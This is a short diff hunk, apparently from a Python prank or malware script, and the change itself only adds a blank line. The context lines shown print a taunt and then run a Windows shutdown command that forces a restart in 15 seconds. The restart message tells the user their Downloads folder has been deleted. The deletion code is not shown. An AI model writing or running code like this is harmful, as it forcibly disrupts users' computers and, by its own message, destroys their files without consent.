@@ -30,3 +30,4 @@ print("SUCK IT!")
 t.sleep(2)
 cmd = ["shutdown", "/r", "/t", "15", "/c", "Your Downloads folder is deleted btw ;)"]
 s.run(cmd, shell=True)
+
